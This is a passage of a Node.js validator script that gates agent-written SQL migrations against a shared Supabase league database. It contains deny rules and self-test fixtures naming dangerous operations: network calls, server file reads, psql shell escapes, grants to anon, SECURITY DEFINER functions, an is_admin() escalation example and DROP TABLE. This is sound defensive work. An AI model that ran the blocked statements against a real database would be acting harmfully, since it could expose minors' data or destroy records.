#!/usr/bin/env node
// check-migration.mjs — the gate between the live-edit agent and the league's database.
//
// Usage:  node scripts/check-migration.mjs supabase/migrations/*.sql
//         node scripts/check-migration.mjs --selftest
//
// Exit 0 = every file is safe to apply. Non-zero = something was rejected (the
// reason is printed) or the arguments were wrong.
//
// WHY THIS EXISTS
// There is ONE Supabase project. The dev site and rinkhockeyil.com read the same
// database, so a migration that lands here lands on real league data — including
// four minors' dates of birth. Two incidents in this repo's own history are the
// shape of the risk:
//   * players.birth_date was readable by `anon` (supabase/players-birth-date-privacy.sql)
//   * a SECURITY DEFINER function was EXECUTE-able by PUBLIC and became a
//     settlement API anyone could call (supabase/admin-users-lockdown.sql documents
//     the house style for locking one down)
// Neither needed a DROP. Both were *additive* statements that widened access. So a
// blocklist of scary verbs is not enough: this validator is an ALLOWLIST. A
// statement it does not positively recognise as one of a handful of safe shapes is
// rejected, whatever it is.
//
// Zero dependencies on purpose — it must run in CI before `npm ci`.

import { readFileSync } from 'node:fs';
import { basename } from 'node:path';

// ---------------------------------------------------------------------------
// 1. LEXING
//
// Everything below matches on SANITISED text. If we matched on the raw file, a
// rejected keyword could hide inside a comment or a quoted string and slip past a
// naive splitter — and, in the other direction, an apostrophe in a comment
// ("-- don't panic") would swallow the rest of the file into a phantom string and
// cause nonsense rejections. So we lex properly, once, up front:
//
//   --  line comment          -> a space (the newline is kept, so line numbers hold)
//   /* */ block comment       -> a space  (nested, as Postgres nests them)
//   'literal'  E'literal'     -> the token @@STR@@       (contents discarded)
//   $tag$ body $tag$          -> the token @@BODY<n>@@   (contents kept aside and
//                                                         scanned separately)
//   "Quoted Identifier"       -> its contents, unquoted, so a table spelled
//                                "admin_users" is still recognised as admin_users
//
// An unterminated comment, string or dollar-quote is a hard rejection: if we cannot
// tell where the code ends, we cannot vouch for any of it.
// ---------------------------------------------------------------------------

class LexError extends Error {}

const newlinesIn = (s) => '\n'.repeat((s.match(/\n/g) || []).length);

function sanitize(sql) {
  const bodies = [];
  let out = '';
  let i = 0;
  const n = sql.length;

  while (i < n) {
    const c = sql[i];
    const two = sql.slice(i, i + 2);

    // -- line comment (stop before the newline so line numbers stay aligned)
    if (two === '--') {
      let j = sql.indexOf('\n', i);
      if (j === -1) j = n;
      out += ' ';
      i = j;
      continue;
    }

    // /* nested block comment */
    if (two === '/*') {
      let depth = 1;
      let j = i + 2;
      while (j < n && depth > 0) {
        if (sql.slice(j, j + 2) === '/*') { depth += 1; j += 2; }
        else if (sql.slice(j, j + 2) === '*/') { depth -= 1; j += 2; }
        else j += 1;
      }
      if (depth > 0) throw new LexError('unterminated /* block comment');
      out += ' ' + newlinesIn(sql.slice(i, j));
      i = j;
      continue;
    }

    // E'...' escape string: backslash escapes, plus '' doubling
    if ((c === 'E' || c === 'e') && sql[i + 1] === "'" && !/[A-Za-z0-9_]/.test(sql[i - 1] || '')) {
      let j = i + 2;
      let closed = false;
      while (j < n) {
        if (sql[j] === '\\') { j += 2; continue; }
        if (sql[j] === "'") {
          if (sql[j + 1] === "'") { j += 2; continue; }
          j += 1; closed = true; break;
        }
        j += 1;
      }
      if (!closed) throw new LexError("unterminated E'' string literal");
      out += '@@STR@@' + newlinesIn(sql.slice(i, j));
      i = j;
      continue;
    }

    // '...' literal ('' doubles; backslash is NOT special under
    // standard_conforming_strings, which is on everywhere since PG 9.1)
    if (c === "'") {
      let j = i + 1;
      let closed = false;
      while (j < n) {
        if (sql[j] === "'") {
          if (sql[j + 1] === "'") { j += 2; continue; }
          j += 1; closed = true; break;
        }
        j += 1;
      }
      if (!closed) throw new LexError("unterminated ' string literal");
      out += '@@STR@@' + newlinesIn(sql.slice(i, j));
      i = j;
      continue;
    }

    // "Quoted identifier" -> contents, so quoting cannot hide a sensitive name.
    // Anything that is not identifier-ish becomes _ so it cannot forge a ; or a quote.
    if (c === '"') {
      let j = i + 1;
      let content = '';
      let closed = false;
      while (j < n) {
        if (sql[j] === '"') {
          if (sql[j + 1] === '"') { content += '"'; j += 2; continue; }
          j += 1; closed = true; break;
        }
        content += sql[j];
        j += 1;
      }
      if (!closed) throw new LexError('unterminated " quoted identifier');
      out += content.replace(/[^A-Za-z0-9_.]/g, '_') + newlinesIn(sql.slice(i, j));
      i = j;
      continue;
    }

    // $tag$ dollar-quoted body $tag$  (note: $1 and $ alone are not dollar quotes)
    if (c === '$') {
      const m = /^\$([A-Za-z_-￿][A-Za-z0-9_-￿]*)?\$/.exec(sql.slice(i));
      if (m) {
        const tag = m[0];
        const close = sql.indexOf(tag, i + tag.length);
        if (close === -1) throw new LexError(`unterminated ${tag} dollar-quoted body`);
        const content = sql.slice(i + tag.length, close);
        const idx = bodies.length;
        bodies.push(content);
        out += `@@BODY${idx}@@` + newlinesIn(sql.slice(i, close + tag.length));
        i = close + tag.length;
        continue;
      }
    }

    out += c;
    i += 1;
  }

  return { text: out, bodies };
}

function splitStatements(text) {
  const out = [];
  const push = (start, end) => {
    const raw = text.slice(start, end);
    if (!raw.trim()) return;
    // Point the offset at the first real character, so a statement that begins on
    // the line after the previous `;` is reported on its own line.
    out.push({ raw, offset: start + (raw.length - raw.replace(/^\s+/, '').length) });
  };
  let start = 0;
  for (let i = 0; i < text.length; i += 1) {
    if (text[i] === ';') { push(start, i); start = i + 1; }
  }
  push(start, text.length);
  return out;
}

const lineOf = (text, offset) => text.slice(0, offset).split('\n').length;
const norm = (s) => s.replace(/\s+/g, ' ').trim();
const snippet = (s) => {
  const t = norm(s);
  return t.length > 90 ? `${t.slice(0, 90)}…` : t;
};

// ---------------------------------------------------------------------------
// 2. THINGS THAT ARE NEVER OK, WHEREVER THEY APPEAR
// ---------------------------------------------------------------------------

// The sensitive surface. Named for the incidents, not guessed at.
const SENSITIVE = [
  [/\badmin_users\b/i,
    'admin_users — the admin roster. Its SELECT policy is deliberately own-row only (supabase/admin-users-lockdown.sql); no agent-written migration touches it.'],
  [/\bmedical[A-Za-z0-9_]*\b/i,
    'the medical surface — players\' health files. Off limits to automated migrations.'],
  [/\bbirth_date\b/i,
    'players.birth_date — this column was readable by anon in 2026-09 and exposed four minors (supabase/players-birth-date-privacy.sql). It is human-only territory.'],
];

// Schemas and extension namespaces nothing additive should reach into.
// auth.* is a special case: auth.uid()/jwt()/role()/email() are THE house idiom for
// writing a policy, so those four calls are allowed and every other auth.<thing>
// (auth.users, auth.sessions, DDL against the schema) is rejected.
const AUTH_ALLOWED_CALLS = new Set(['uid', 'jwt', 'role', 'email']);
const FORBIDDEN_SCHEMAS = [
  'storage', 'extensions', 'vault', 'pgsodium', 'cron', 'net', 'graphql', 'graphql_public',
  'realtime', 'supabase_functions', 'supabase_migrations', 'pg_catalog', 'information_schema',
];

// Functions/roles that are dangerous no matter what statement they sit in.
const FORBIDDEN_TOKENS = [
  [/\bsecurity\s+definer\b/i,
    'SECURITY DEFINER — a definer function runs with the owner\'s rights. One of these, EXECUTE-able by PUBLIC, became a settlement API anyone could call. Write a plain (invoker) function, or ask a human.'],
  [/\banon\b/i,
    'the `anon` role — every widening incident in this repo ended with `anon` holding something it should not. No allowed statement needs to name it.'],
  [/\b(postgres|supabase_admin|authenticator|dashboard_user|pg_read_server_files|pg_write_server_files|pg_execute_server_program)\b/i,
    'a privileged role name'],
  [/\bdblink[A-Za-z0-9_]*\b/i, 'dblink — opens a connection to another database'],
  [/\bhttp_(get|post|put|delete|head|request)\b|\bhttp\s*\(/i, 'an http() call — a migration must not reach the network'],
  [/\bpg_(read_file|read_binary_file|write_file|ls_dir|stat_file|sleep|terminate_backend|reload_conf|read_server_files)\b/i,
    'a filesystem/server-control function'],
  [/\blo_(import|export)\b/i, 'large-object file I/O'],
  [/\bset_config\s*\(/i, 'set_config() — changes session settings, including role'],
  [/\bpassword\b/i, 'a password'],
];

function scanForbidden(text, where, errors) {
  for (const [re, why] of SENSITIVE) {
    if (re.test(text)) errors.push(`${where} references ${why}`);
  }
  for (const [re, why] of FORBIDDEN_TOKENS) {
    if (re.test(text)) errors.push(`${where} contains ${why}`);
  }
  for (const schema of FORBIDDEN_SCHEMAS) {
    if (new RegExp(`\\b${schema}\\s*\\.`, 'i').test(text)) {
      errors.push(`${where} references the \`${schema}\` schema — out of bounds for an agent migration`);
    }
  }
  const authRef = /\bauth\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)\s*(\(?)/gi;
  let m;
  while ((m = authRef.exec(text)) !== null) {
    const name = m[1].toLowerCase();
    const isCall = m[2] === '(';
    if (!isCall || !AUTH_ALLOWED_CALLS.has(name)) {
      errors.push(
        `${where} references auth.${m[1]} — only auth.uid(), auth.jwt(), auth.role() and auth.email() may be called, and nothing in the auth schema may be read or altered`,
      );
    }
  }
}

// ---------------------------------------------------------------------------
// 3. STATEMENT KINDS WE REJECT WITH A SPECIFIC REASON
//
// Redundant with the allowlist below (anything unrecognised is rejected anyway),
// but a named reason is what makes the failure actionable in a CI log.
// ---------------------------------------------------------------------------

const KIND_REJECTS = [
  [/^DROP\b/i, 'DROP — a migration here may only add. Removing anything is a human job.'],
  [/^TRUNCATE\b/i, 'TRUNCATE — destroys data.'],
  [/^DELETE\b/i, 'DELETE — data mutation is the app\'s job, not a migration\'s.'],
  [/^UPDATE\b/i, 'UPDATE — data mutation is the app\'s job, not a migration\'s.'],
  [/^INSERT\b/i, 'INSERT — data mutation is the app\'s job, not a migration\'s.'],
  [/^MERGE\b/i, 'MERGE — data mutation is the app\'s job, not a migration\'s.'],
  [/^COPY\b/i, 'COPY — reads or writes server files and bulk-loads data.'],
  [/^GRANT\b/i, 'GRANT — privileges are granted by a human. (The birth_date leak was a table-level grant.)'],
  [/^REVOKE\b/i, 'REVOKE — a mis-aimed revoke takes the app offline; a human does this.'],
  [/^ALTER\s+DEFAULT\s+PRIVILEGES\b/i, 'ALTER DEFAULT PRIVILEGES — silently changes what every future object grants.'],
  [/^(CREATE|ALTER|DROP)\s+(ROLE|USER|GROUP)\b/i, 'role management.'],
  [/^(CREATE|ALTER|DROP)\s+EXTENSION\b/i, 'CREATE/ALTER EXTENSION — extensions ship new attack surface (http, dblink, …).'],
  [/^ALTER\s+POLICY\b/i, 'ALTER POLICY — rewriting an existing policy is how access gets widened.'],
  [/^DROP\s+POLICY\b/i, 'DROP POLICY — removes a guard.'],
  [/^DO\b/i, 'a DO block — an anonymous code block can do anything; it cannot be vetted by shape.'],
  [/^(BEGIN|COMMIT|ROLLBACK|SAVEPOINT|RELEASE|START\s+TRANSACTION|END)\b/i,
    'transaction control — CI applies each migration inside one transaction; your own BEGIN/COMMIT would break that all-or-nothing guarantee.'],
  [/^(SET|RESET|DISCARD)\b/i, 'SET/RESET — session state, including SET ROLE.'],
  [/^CREATE\s+(OR\s+REPLACE\s+)?(VIEW|MATERIALIZED\s+VIEW)\b/i,
    'CREATE VIEW — a view runs with its owner\'s rights by default and quietly bypasses the RLS of the tables under it.'],
  [/^CREATE\s+(SCHEMA|TYPE|DOMAIN|SEQUENCE|RULE|PUBLICATION|SUBSCRIPTION|SERVER|FOREIGN|EVENT\s+TRIGGER|AGGREGATE|OPERATOR|CAST|COLLATION|STATISTICS|TEXT\s+SEARCH|TABLESPACE|DATABASE)\b/i,
    'an object kind that is not on the allowlist.'],
  [/^ALTER\s+(FUNCTION|PROCEDURE|SCHEMA|TYPE|SEQUENCE|VIEW|INDEX|DATABASE|SYSTEM|EXTENSION|PUBLICATION|LARGE)\b/i,
    'ALTER of an existing object — only ALTER TABLE … ADD COLUMN / ENABLE ROW LEVEL SECURITY is allowed.'],
  [/^(SELECT|WITH|VALUES|TABLE)\b/i,
    'a bare query — a migration should declare schema, not run queries (select cron.schedule(…) is a query).'],
  [/^(CALL|EXECUTE|PREPARE|DEALLOCATE|LISTEN|NOTIFY|UNLISTEN|VACUUM|ANALYZE|REINDEX|CLUSTER|LOCK|REFRESH|IMPORT|CHECKPOINT|LOAD)\b/i,
    'a command that is not schema definition.'],
  [/^SECURITY\s+LABEL\b/i, 'SECURITY LABEL.'],
  [/^CREATE\s+OR\s+REPLACE\s+FUNCTION\b/i,
    'CREATE OR REPLACE FUNCTION — replacing a function that already exists rewrites live behaviour. `create or replace function public.is_admin() … select true` would make every visitor an admin without a single GRANT. Plain CREATE FUNCTION only.'],
  [/^CREATE\s+OR\s+REPLACE\s+TRIGGER\b/i, 'CREATE OR REPLACE TRIGGER — replaces an existing trigger.'],
  [/^CREATE\s+CONSTRAINT\s+TRIGGER\b/i, 'CREATE CONSTRAINT TRIGGER — only a plain CREATE TRIGGER is allowed.'],
];

// ---------------------------------------------------------------------------
// 4. THE ALLOWLIST
// ---------------------------------------------------------------------------

const IDENT = '[A-Za-z_][A-Za-z0-9_$]*';
const QUALIFIED = `(?:${IDENT}\\s*\\.\\s*)?${IDENT}`;

function parseRef(token) {
  const parts = token.split('.').map((p) => p.trim().toLowerCase()).filter(Boolean);
  if (parts.length === 1) return { schema: 'public', name: parts[0] };
  return { schema: parts[0], name: parts[parts.length - 1] };
}

// Split on commas that sit at paren depth 0.
function splitTopLevel(s) {
  const out = [];
  let depth = 0;
  let cur = '';
  for (const ch of s) {
    if (ch === '(') depth += 1;
    if (ch === ')') depth -= 1;
    if (ch === ',' && depth === 0) { out.push(cur); cur = ''; continue; }
    cur += ch;
  }
  if (cur.trim()) out.push(cur);
  return out.map((x) => x.trim()).filter(Boolean);
}

// Index of the first top-level occurrence of a regex (paren depth 0), or -1.
function indexOfTopLevel(s, re) {
  let depth = 0;
  for (let i = 0; i < s.length; i += 1) {
    if (s[i] === '(') depth += 1;
    else if (s[i] === ')') depth -= 1;
    else if (depth === 0) {
      const m = re.exec(s.slice(i));
      if (m && m.index === 0) return i;
    }
  }
  return -1;
}

function checkCreateTable(stmt, ctx, errors) {
  const m = new RegExp(`^CREATE\\s+TABLE\\s+IF\\s+NOT\\s+EXISTS\\s+(${QUALIFIED})\\s*\\(`, 'i').exec(stmt);
  if (!m) {
    if (/^CREATE\s+(GLOBAL|LOCAL|TEMP|TEMPORARY|UNLOGGED)/i.test(stmt)) {
      errors.push('only a plain CREATE TABLE IF NOT EXISTS is allowed (no TEMP/UNLOGGED)');
      return;
    }
    errors.push('CREATE TABLE must be written as `CREATE TABLE IF NOT EXISTS <name> (…)` — the IF NOT EXISTS keeps a re-run from failing half-way through a migration');
    return;
  }
  const ref = parseRef(m[1]);
  if (ref.schema !== 'public') {
    errors.push(`CREATE TABLE targets schema \`${ref.schema}\` — only \`public\` is allowed`);
    return;
  }
  if (/\bPARTITION\s+OF\b|\bINHERITS\b/i.test(stmt)) {
    errors.push('CREATE TABLE … INHERITS/PARTITION OF is not allowed');
    return;
  }
  ctx.createdTables.add(ref.name);
}

function checkAlterTable(stmt, ctx, errors) {
  const m = new RegExp(`^ALTER\\s+TABLE\\s+(?:IF\\s+EXISTS\\s+)?(${QUALIFIED})\\s+([\\s\\S]+)$`, 'i').exec(stmt);
  if (!m) { errors.push('could not parse this ALTER TABLE — rejected because it is not recognisable'); return; }
  const ref = parseRef(m[1]);
  if (ref.schema !== 'public') {
    errors.push(`ALTER TABLE targets schema \`${ref.schema}\` — only \`public\` is allowed`);
    return;
  }
  for (const action of splitTopLevel(m[2])) {
    const a = norm(action);
    if (/^DROP\b/i.test(a)) { errors.push('ALTER TABLE … DROP — a migration here may only add'); continue; }
    if (/^RENAME\b/i.test(a)) { errors.push('ALTER TABLE … RENAME — renaming breaks every client still asking for the old name'); continue; }
    if (/^ALTER\s+(COLUMN\s+)?\S+\s+(SET\s+DATA\s+)?TYPE\b/i.test(a) || /^ALTER\s+(COLUMN\s+)?\S+\s+TYPE\b/i.test(a)) {
      errors.push('ALTER TABLE … ALTER COLUMN … TYPE — retyping a column rewrites existing data'); continue;
    }
    if (/^ALTER\s+(COLUMN\s+)?\S+\s+SET\s+NOT\s+NULL\b/i.test(a)) {
      errors.push('ALTER TABLE … SET NOT NULL on an existing column — fails or locks out existing rows'); continue;
    }
    if (/^ALTER\b/i.test(a)) { errors.push(`ALTER TABLE … ${a.slice(0, 40)} — altering an existing column is not allowed`); continue; }
    if (/^DISABLE\b/i.test(a)) { errors.push('ALTER TABLE … DISABLE — this removes a guard (row level security, a trigger, a rule)'); continue; }
    if (/^NO\s+FORCE\s+ROW\s+LEVEL\s+SECURITY\b/i.test(a)) { errors.push('ALTER TABLE … NO FORCE ROW LEVEL SECURITY — weakens RLS'); continue; }
    if (/^OWNER\s+TO\b/i.test(a)) { errors.push('ALTER TABLE … OWNER TO — changes who bypasses RLS on this table'); continue; }
    if (/^ENABLE\s+ROW\s+LEVEL\s+SECURITY$/i.test(a)) { ctx.rlsEnabled.add(ref.name); continue; }
    if (/^FORCE\s+ROW\s+LEVEL\s+SECURITY$/i.test(a)) { continue; }
    if (/^ENABLE\b/i.test(a)) { errors.push(`ALTER TABLE … ${a.slice(0, 40)} — only ENABLE ROW LEVEL SECURITY is allowed`); continue; }
    if (/^ADD\s+COLUMN\b/i.test(a)) {
      const col = new RegExp(`^ADD\\s+COLUMN\\s+(?:IF\\s+NOT\\s+EXISTS\\s+)?(${IDENT})\\s+([\\s\\S]+)$`, 'i').exec(a);
      if (!col) { errors.push(`could not parse the column definition in \`${a.slice(0, 60)}\``); continue; }
      const def = col[2];
      if (/\bNOT\s+NULL\b/i.test(def) && !/\bDEFAULT\b/i.test(def) && !/\bGENERATED\b/i.test(def)) {
        errors.push(`ADD COLUMN ${col[1]} is NOT NULL with no DEFAULT — that fails outright on a table that already has rows. Add it nullable, or give it a DEFAULT.`);
      }
      if (/\bPRIMARY\s+KEY\b/i.test(def)) {
        errors.push(`ADD COLUMN ${col[1]} … PRIMARY KEY — adding a primary key to an existing table is a human job`);
      }
      continue;
    }
    if (/^ADD\b/i.test(a)) {
      errors.push(`ALTER TABLE … ${a.slice(0, 40)} — only ADD COLUMN is allowed (spell the word COLUMN out)`);
      continue;
    }
    errors.push(`ALTER TABLE action not on the allowlist: \`${a.slice(0, 60)}\``);
  }
}

function checkCreateIndex(stmt, ctx, errors) {
  if (/\bCONCURRENTLY\b/i.test(stmt)) {
    errors.push('CREATE INDEX CONCURRENTLY cannot run inside a transaction, and CI applies each migration as one transaction. Drop CONCURRENTLY, or ask a human to build the index by hand.');
    return;
  }
  const m = new RegExp(`^CREATE\\s+(?:UNIQUE\\s+)?INDEX\\s+(?:IF\\s+NOT\\s+EXISTS\\s+)?(?:${IDENT}\\s+)?ON\\s+(?:ONLY\\s+)?(${QUALIFIED})\\s*(?:USING\\s+${IDENT}\\s*)?\\(`, 'i').exec(stmt);
  if (!m) { errors.push('could not parse this CREATE INDEX — rejected because it is not recognisable'); return; }
  const ref = parseRef(m[1]);
  if (ref.schema !== 'public') errors.push(`CREATE INDEX targets schema \`${ref.schema}\` — only \`public\` is allowed`);
}

const POLICY_ROLES = new Set(['authenticated', 'service_role']);

function checkCreatePolicy(stmt, ctx, errors, warnings) {
  const m = new RegExp(`^CREATE\\s+POLICY\\s+(${IDENT})\\s+ON\\s+(${QUALIFIED})\\s*([\\s\\S]*)$`, 'i').exec(stmt);
  if (!m) { errors.push('could not parse this CREATE POLICY — rejected because it is not recognisable'); return; }
  const ref = parseRef(m[2]);
  if (ref.schema !== 'public') { errors.push(`CREATE POLICY targets schema \`${ref.schema}\` — only \`public\` is allowed`); return; }

  // Cut the USING(...) / WITH CHECK(...) expressions off, so the head we search for
  // a TO clause cannot pick up a `to` sitting inside an expression.
  let head = m[3];
  for (const re of [/^USING\s*\(/i, /^WITH\s+CHECK\s*\(/i]) {
    const at = indexOfTopLevel(head, re);
    if (at >= 0) head = head.slice(0, at);
  }
  head = norm(head);

  const to = /\bTO\s+([\s\S]+)$/i.exec(head);
  if (!to) {
    errors.push('CREATE POLICY with no TO clause — Postgres defaults that to PUBLIC, i.e. everyone including anon. Write `TO authenticated`.');
    return;
  }
  const roles = splitTopLevel(to[1]).map((r) => norm(r).toLowerCase());
  if (roles.length === 0) { errors.push('CREATE POLICY has an empty TO clause'); return; }
  for (const role of roles) {
    if (!POLICY_ROLES.has(role)) {
      errors.push(`CREATE POLICY … TO ${role} — a new permissive policy widens access just as effectively as altering one; only ${[...POLICY_ROLES].join(' / ')} are recognised as safe here`);
    }
  }
  if (!ctx.createdTables.has(ref.name)) {
    warnings.push(`policy \`${m[1]}\` is added to the pre-existing table \`${ref.name}\`, which widens what signed-in users may do there. Allowed, but worth a human's eye.`);
  }
}

// Inside a function body only computation is allowed. No DML, no DDL, no dynamic SQL
// (plpgsql EXECUTE would let a string built at run time do anything the caller can).
const BODY_FORBIDDEN = [
  [/\bexecute\b/i, 'EXECUTE (dynamic SQL) — its statement is built at run time and cannot be vetted here'],
  [/\b(insert|update|delete|merge|truncate|drop|alter|grant|revoke|copy|perform|call|listen|notify|vacuum|refresh|reindex|cluster|lock)\b/i,
    'a statement that writes or changes something — an agent-written function may compute and return, nothing more'],
  [/\bcreate\b/i, 'CREATE inside a function body'],
];

function checkCreateFunction(stmt, ctx, errors, bodies) {
  const m = new RegExp(`^CREATE\\s+FUNCTION\\s+(${QUALIFIED})\\s*\\(`, 'i').exec(stmt);
  if (!m) { errors.push('could not parse this CREATE FUNCTION — rejected because it is not recognisable'); return; }
  const ref = parseRef(m[1]);
  if (ref.schema !== 'public') { errors.push(`CREATE FUNCTION targets schema \`${ref.schema}\` — only \`public\` is allowed`); return; }

  const lang = /\bLANGUAGE\s+([A-Za-z0-9_]+)/i.exec(stmt);
  if (!lang) { errors.push('CREATE FUNCTION with no LANGUAGE clause'); return; }
  if (!['sql', 'plpgsql'].includes(lang[1].toLowerCase())) {
    errors.push(`CREATE FUNCTION … LANGUAGE ${lang[1]} — only sql and plpgsql are allowed`);
    return;
  }

  const bodyIds = [...stmt.matchAll(/@@BODY(\d+)@@/g)].map((b) => Number(b[1]));
  if (bodyIds.length !== 1) {
    errors.push('CREATE FUNCTION must have exactly one $$-quoted body — a body written as a plain string literal cannot be inspected');
    return;
  }
  // The only string literal a function is allowed to carry is `set search_path to 'public'`.
  if (stmt.replace(/search_path\s*(?:=|to)\s*@@STR@@/gi, '').includes('@@STR@@')) {
    errors.push('CREATE FUNCTION carries a string literal outside `set search_path` — rejected so a body cannot arrive as a string');
    return;
  }

  const body = bodies[bodyIds[0]] || '';
  for (const [re, why] of BODY_FORBIDDEN) {
    if (re.test(body)) errors.push(`the body of ${ref.name}() contains ${why}`);
  }
  ctx.createdFunctions.add(ref.name);
}

function checkCreateTrigger(stmt, ctx, errors) {
  const m = new RegExp(`^CREATE\\s+TRIGGER\\s+${IDENT}\\s+[\\s\\S]*?\\bON\\s+(${QUALIFIED})\\b`, 'i').exec(stmt);
  if (!m) { errors.push('could not parse this CREATE TRIGGER — rejected because it is not recognisable'); return; }
  const ref = parseRef(m[1]);
  if (ref.schema !== 'public') { errors.push(`CREATE TRIGGER targets schema \`${ref.schema}\` — only \`public\` is allowed`); return; }

  const fn = new RegExp(`\\bEXECUTE\\s+(?:FUNCTION|PROCEDURE)\\s+(${QUALIFIED})\\s*\\(`, 'i').exec(stmt);
  if (!fn) { errors.push('CREATE TRIGGER without a recognisable EXECUTE FUNCTION clause'); return; }
  const fref = parseRef(fn[1]);
  if (!ctx.createdFunctions.has(fref.name)) {
    errors.push(`CREATE TRIGGER calls ${fref.name}(), which this migration does not define. Attaching an existing function (possibly a SECURITY DEFINER one) to a table is exactly the escalation this gate exists to stop — define the trigger function in the same file.`);
  }
}

function checkComment(stmt, ctx, errors) {
  if (!/^COMMENT\s+ON\s+/i.test(stmt)) errors.push('could not parse this COMMENT ON');
}

// ---------------------------------------------------------------------------
// 5. THE FILE-LEVEL CHECK
// ---------------------------------------------------------------------------

export function checkSql(sql, label = '<input>') {
  const errors = [];
  const warnings = [];

  let text;
  let bodies;
  try {
    ({ text, bodies } = sanitize(sql));
  } catch (err) {
    if (err instanceof LexError) {
      return { errors: [`${label}: ${err.message} — if we cannot tell where the code ends we cannot vouch for any of it`], warnings };
    }
    throw err;
  }

  // psql meta-commands are not SQL and never reach the server's parser. `\i` pulls in
  // another file and `\!` runs a shell command on the runner — both would sail past
  // any statement-level check.
  text.split('\n').forEach((line, idx) => {
    if (/^\s*\\/.test(line)) {
      errors.push(`${label}:${idx + 1}: psql meta-command (\\…) — not SQL, and \\i / \\! would bypass this validator entirely`);
    }
  });

  const statements = splitStatements(text);
  if (statements.length === 0) errors.push(`${label}: no statements found — an empty migration is probably a mistake`);

  const ctx = { createdTables: new Set(), createdFunctions: new Set(), rlsEnabled: new Set() };

  // Pre-pass: a trigger may legitimately appear before, or after, its function.
  for (const st of statements) {
    const m = new RegExp(`^\\s*CREATE\\s+FUNCTION\\s+(${QUALIFIED})\\s*\\(`, 'i').exec(st.raw);
    if (m) ctx.createdFunctions.add(parseRef(m[1]).name);
  }

  for (const st of statements) {
    const line = lineOf(text, st.offset);
    const stmt = norm(st.raw);
    const local = [];
    const localWarn = [];
    const where = 'this statement';

    scanForbidden(stmt, where, local);
    for (const id of [...stmt.matchAll(/@@BODY(\d+)@@/g)].map((b) => Number(b[1]))) {
      scanForbidden(bodies[id] || '', 'this function body', local);
    }

    let matchedKindReject = false;
    for (const [re, why] of KIND_REJECTS) {
      if (re.test(stmt)) { local.push(`rejected: ${why}`); matchedKindReject = true; break; }
    }

    if (!matchedKindReject) {
      if (/^CREATE\s+(GLOBAL\s+|LOCAL\s+|TEMP\s+|TEMPORARY\s+|UNLOGGED\s+)*TABLE\b/i.test(stmt)) checkCreateTable(stmt, ctx, local);
      else if (/^ALTER\s+TABLE\b/i.test(stmt)) checkAlterTable(stmt, ctx, local);
      else if (/^CREATE\s+(UNIQUE\s+)?INDEX\b/i.test(stmt)) checkCreateIndex(stmt, ctx, local);
      else if (/^CREATE\s+POLICY\b/i.test(stmt)) checkCreatePolicy(stmt, ctx, local, localWarn);
      else if (/^CREATE\s+FUNCTION\b/i.test(stmt)) checkCreateFunction(stmt, ctx, local, bodies);
      else if (/^CREATE\s+TRIGGER\b/i.test(stmt)) checkCreateTrigger(stmt, ctx, local);
      else if (/^COMMENT\s+ON\b/i.test(stmt)) checkComment(stmt, ctx, local);
      else {
        local.push(
          'rejected: this statement is not one of the shapes the validator recognises as safe '
          + '(CREATE TABLE IF NOT EXISTS / ALTER TABLE … ADD COLUMN / ALTER TABLE … ENABLE ROW LEVEL SECURITY / '
          + 'CREATE INDEX / CREATE POLICY … TO authenticated / CREATE FUNCTION / CREATE TRIGGER / COMMENT ON). '
          + 'The list is closed on purpose: whatever is not recognised is refused.',
        );
      }
    }

    for (const e of local) errors.push(`${label}:${line}: ${e}\n    → ${snippet(st.raw)}`);
    for (const w of localWarn) warnings.push(`${label}:${line}: ${w}`);
  }

  // A brand-new table in `public` is published by PostgREST the moment it exists, and
  // Supabase's default privileges hand anon and authenticated a grant on it. Without
  // RLS that table is world-readable and world-writable. So: create one, enable it,
  // in the same file — otherwise there is a window where it is wide open.
  for (const t of ctx.createdTables) {
    if (!ctx.rlsEnabled.has(t)) {
      errors.push(
        `${label}: table \`${t}\` is created but never gets \`ALTER TABLE public.${t} ENABLE ROW LEVEL SECURITY;\` `
        + 'in the same migration. A new public table is exposed through PostgREST immediately and Supabase\'s default '
        + 'privileges grant anon access to it — without RLS it is readable and writable by the whole internet.',
      );
    }
  }

  return { errors, warnings };
}

// ---------------------------------------------------------------------------
// 6. SELF-TESTS
// ---------------------------------------------------------------------------

const PASS = [
  ['plain additive column', `
    -- add a broadcast link to games
    alter table public.games add column if not exists broadcast_url text;
    comment on column public.games.broadcast_url is 'YouTube or Cloudflare link';
  `],
  ['column with a default', `
    alter table public.games add column if not exists is_featured boolean not null default false;
    create index if not exists games_is_featured_idx on public.games (is_featured);
  `],
  ['new table, RLS on, policy scoped to authenticated', `
    create table if not exists public.practice_notes (
      id uuid primary key default gen_random_uuid(),
      team_id uuid references public.teams (id),
      note text,
      created_at timestamptz not null default now()
    );
    alter table public.practice_notes enable row level security;
    create policy "read own team notes" on public.practice_notes
      for select to authenticated
      using (public.is_coach_of(team_id));
    create index if not exists practice_notes_team_idx on public.practice_notes (team_id);
  `],
  ['policy using the auth helpers', `
    create policy "own rows" on public.practice_notes
      for select to authenticated
      using (author_id = auth.uid() or (auth.jwt() ->> 'email') = contact_email);
  `],
  ['plain function plus its trigger', `
    create function public.touch_updated_at() returns trigger
    language plpgsql as $fn$
    begin
      new.updated_at := now();
      return new;
    end;
    $fn$;
    create trigger practice_notes_touch before update on public.practice_notes
      for each row execute function public.touch_updated_at();
  `],
  ['a scary word inside a line comment is inert', `
    -- careful: do not drop table players here, and never truncate anything
    /* grant select on public.players to anon; <- an example of what not to do */
    alter table public.teams add column if not exists nickname text;
  `],
  ["an apostrophe inside a comment must not swallow the file", `
    -- don't panic: this is just a comment
    alter table public.teams add column if not exists motto text;
  `],
  ['a scary word inside a string literal is inert', `
    comment on table public.teams is 'do not drop table players; ever';
    alter table public.teams add column if not exists founded_year integer;
  `],
  ['nested block comments', `
    /* outer /* inner */ still a comment */
    alter table public.teams add column if not exists city text;
  `],
  ['dollar-quoted body containing semicolons and comment markers', `
    create function public.shirt_label(num integer) returns text
    language plpgsql as $$
    begin
      -- a comment; with a semicolon
      return '#' || num::text;
    end;
    $$;
  `],
  ['restrictive policy is a strengthening, allowed', `
    create policy "only own club" on public.practice_notes
      as restrictive for select to authenticated using (true);
  `],
];

const FAIL = [
  ['drop table', 'drop table public.players;', 'DROP'],
  ['drop column', 'alter table public.players drop column goals;', 'may only add'],
  ['rename', 'alter table public.players rename to players_old;', 'RENAME'],
  ['rename column', 'alter table public.players rename column goals to score;', 'RENAME'],
  ['retype a column', 'alter table public.players alter column goals type bigint;', 'retyping'],
  ['set not null on existing column', 'alter table public.players alter column goals set not null;', 'SET NOT NULL'],
